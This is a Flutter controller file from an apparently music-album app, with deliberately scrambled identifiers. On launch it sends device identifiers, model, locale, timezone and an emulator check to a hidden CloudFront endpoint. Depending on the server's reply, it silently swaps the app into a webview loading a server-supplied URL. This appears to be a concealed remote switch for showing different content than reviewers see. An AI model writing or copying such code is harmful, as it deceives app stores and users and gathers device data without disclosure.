import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class MagicAlbumMasterLogic extends GetxController {

  var kymtodfn = RxBool(false);
  var dvzolxge = RxBool(true);
  var naspi = RxString("");
  var hckbvjuo = RxBool(false);
  var hsjxm = RxBool(true);
  final oamrfjxpeu = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    chdmaynr();
  }


  Future<void> chdmaynr() async {
    hckbvjuo.value = true;
    hsjxm.value = true;
    dvzolxge.value = false;

    oamrfjxpeu.post("https://d7ir8bf7p2gcd.cloudfront.net/hnqzcvytwkbil",data: await jhbzdocviy()).then((value) {
      var arwyfo = value.data["arwyfo"] as String;
      var dctul = value.data["dctul"] as bool;
      if (dctul) {
        naspi.value = arwyfo;
        efwgb();
      } else {
        qwptin();
      }
    }).catchError((e) {
      dvzolxge.value = true;
      hsjxm.value = true;
      hckbvjuo.value = false;
    });
  }

  Future<Map<String, dynamic>> jhbzdocviy() async {
    final DeviceInfoPlugin irpy = DeviceInfoPlugin();
    PackageInfo lhobuvye_acvjgpm = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var xzjyhao = Platform.localeName;
    var dmgjnb_wN = currentTimeZone;

    var dmgjnb_tqg = lhobuvye_acvjgpm.packageName;
    var dmgjnb_ItW = lhobuvye_acvjgpm.version;
    var dmgjnb_Kn = lhobuvye_acvjgpm.buildNumber;

    var dmgjnb_yvnwhBA = lhobuvye_acvjgpm.appName;
    var dmgjnb_Juq = "";
    var dmgjnb_Vhk  = "";
    var dmgjnb_cyATqE = "";
    var soltedp = "";
    var nqcgkxwl = "";
    var gmftqlci = "";
    var pwqofcdb = "";
    var cwprl = "";
    var qzkxpsmg = "";


    var dmgjnb_WkoSIbw = "";
    var dmgjnb_poTMQ = false;

    if (GetPlatform.isAndroid) {
      dmgjnb_WkoSIbw = "android";
      var hsvope = await irpy.androidInfo;

      dmgjnb_cyATqE = hsvope.brand;

      dmgjnb_Juq  = hsvope.model;
      dmgjnb_Vhk = hsvope.id;

      dmgjnb_poTMQ = hsvope.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      dmgjnb_WkoSIbw = "ios";
      var nglmqrd = await irpy.iosInfo;
      dmgjnb_cyATqE = nglmqrd.name;
      dmgjnb_Juq = nglmqrd.model;

      dmgjnb_Vhk = nglmqrd.identifierForVendor ?? "";
      dmgjnb_poTMQ  = nglmqrd.isPhysicalDevice;
    }
    var res = {
      "dmgjnb_Kn": dmgjnb_Kn,
      "dmgjnb_tqg": dmgjnb_tqg,
      "gmftqlci" : gmftqlci,
      "cwprl" : cwprl,
      "dmgjnb_Juq": dmgjnb_Juq,
      "dmgjnb_wN": dmgjnb_wN,
      "dmgjnb_cyATqE": dmgjnb_cyATqE,
      "dmgjnb_Vhk": dmgjnb_Vhk,
      "xzjyhao": xzjyhao,
      "dmgjnb_WkoSIbw": dmgjnb_WkoSIbw,
      "dmgjnb_poTMQ": dmgjnb_poTMQ,
      "soltedp" : soltedp,
      "dmgjnb_ItW": dmgjnb_ItW,
      "nqcgkxwl" : nqcgkxwl,
      "dmgjnb_yvnwhBA": dmgjnb_yvnwhBA,
      "pwqofcdb" : pwqofcdb,
      "qzkxpsmg" : qzkxpsmg,

    };
    return res;
  }

  Future<void> qwptin() async {
    Get.offNamed("/magic_tab");
  }

  Future<void> efwgb() async {
    Get.offNamed("/magic_music-album-config");
  }

}
